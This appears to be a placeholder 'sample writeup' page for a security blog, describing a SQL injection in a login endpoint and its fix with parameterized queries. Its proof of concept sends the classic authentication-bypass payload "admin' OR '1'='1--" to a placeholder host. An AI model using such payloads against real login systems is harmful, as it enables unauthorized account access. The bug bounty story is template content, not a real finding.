---
title: "Sample Writeup - SQL Injection Vulnerability"
collection: writeups
permalink: /writeups/2024-12-28-sample-writeup/
date: 2024-12-28
excerpt: "A detailed writeup of a SQL injection vulnerability discovered during a bug bounty program."
header:
  teaser: /images/profile.png
---

This is a sample writeup demonstrating how writeups will appear on the site.

## Overview

During a recent bug bounty engagement, I discovered a SQL injection vulnerability in the user authentication system. This writeup details the discovery process, exploitation, and impact.

## Discovery

The vulnerability was found in the login endpoint:

```
POST /api/login
```

## Impact

- **Severity**: Critical
- **CVSS Score**: 9.8
- **Affected Systems**: User authentication database

## Technical Details

The application was vulnerable to SQL injection in the username parameter:

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```

## Proof of Concept

```python
import requests

payload = "admin' OR '1'='1--"
response = requests.post('https://target.com/api/login', 
                        data={'username': payload, 'password': 'test'})
```

## Remediation

The issue was fixed by implementing parameterized queries and input validation.

![Sample Image](/images/profile.png)

